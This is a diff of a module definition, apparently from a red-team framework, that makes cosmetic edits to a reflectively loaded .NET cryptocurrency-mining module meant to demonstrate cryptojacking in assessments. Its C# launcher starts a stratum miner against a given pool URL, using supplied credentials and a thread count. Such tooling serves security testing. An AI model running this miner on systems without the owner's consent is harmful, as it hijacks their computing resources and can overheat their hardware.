@@ -4,7 +4,7 @@ authors:
     handle: Cx01N
     link: https://twitter.com/Cx01N_
 description: |
-  A .NET implementation of a stratum miner in C# which can be reflectively loaded. Intended for demonstration of cryptojacking attacks during an assessment. Will cause a spike in resource usage and may cause temprature rises in hardware if left running for prolonged periods
+  A .NET implementation of a stratum miner in C# which can be reflectively loaded. Intended for demonstration of cryptojacking attacks during an assessment. Will cause a spike in resource usage and may cause temperature rises in hardware if left running for prolonged periods.
 software: ''
 tactics: [TA0040]
 techniques: [T1496.001]
@@ -41,14 +41,12 @@ options:
     suggested_values: []
 csharp:
   UnsafeCompile: false
-  CompatibleDotNetVersions:
-    - Net40
+  CompatibleDotNetVersions: [Net40]
   Code: |
     using System;
     using System.IO;
     using System.Reflection;
     using DotNetStratumMiner;
-
     public static class Program
     {
         public static void Main(string[] args)
@@ -57,11 +55,9 @@ csharp:
             string username = args.Length > 1 ? args[1] : "";
             string password = args.Length > 2 ? args[2] : "";
             string threads = args.Length > 3 ? args[3] : "";
-
             string result = StartStratumMiner(url, username, password, threads);
             Console.WriteLine(result);
         }
-
         public static string StartStratumMiner(string url, string username, string password, string threads)
         {
             using (StringWriter stringWriter = new StringWriter())
@@ -83,19 +79,15 @@ csharp:
                         stringWriter.WriteLine("Failed to load: " + resourceName);
                         return null;
                     };
-
                     stringWriter.WriteLine("Starting Stratum Miner");
                     string[] minerArgs = { "-o " + url, "-u " + username, "-p " + password, "-t " + threads };
-
                     DotNetStratumMiner.Program.Main(minerArgs);
-
                     stringWriter.WriteLine("Stratum Miner execution finished.");
                 }
                 catch (Exception e)
                 {
                     stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
                 }
-
                 return stringWriter.ToString();
             }
         }
@@ -105,8 +97,7 @@ csharp:
       Description: A .NET implementation of a stratum miner in C#.
       Location: DotNetStratumMiner\
       Language: CSharp
-      CompatibleDotNetVersions:
-        - Net40
+      CompatibleDotNetVersions: [Net40]
       ReferenceAssemblies:
         - Name: System.dll
           Location: net40\System.dll
